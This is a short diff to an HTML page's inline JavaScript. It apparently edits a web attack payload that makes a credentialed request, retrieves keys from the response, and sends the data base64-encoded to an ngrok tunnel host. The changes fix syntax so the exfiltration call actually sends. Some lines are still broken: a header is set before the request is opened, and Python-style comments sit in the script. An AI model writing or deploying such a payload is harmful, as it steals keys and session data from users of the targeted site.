@@ -12,8 +12,8 @@
     
     req.withCredentials = true;
     req.setRequestHeader("User-Agent","alwi");
- ##   req.setRequestHeader('Content-Type','application/json')
-    #Send the request 
+ ## req.setRequestHeader('Content-Type','application/json')
+  
         req.send(null);
 
         function retrieveKeys() {
@@ -22,11 +22,11 @@
         };
    
       async function callIt(a){
-            var data = a;
-            var req2 = new XMLHttpRequest()
-            req2.setRequestHeader("User-Agent", "QuxXS")
+            var data = await a;
+            var req2 = new XMLHttpRequest();
+            req2.setRequestHeader("User-Agent", "QuxXS");
             await req2.open("GET", "https://4778-103-83-159-18.ngrok-free.app" + btoa(data),true);
-            req.send()
+            req2.send();
       }
   </script>
   <body>
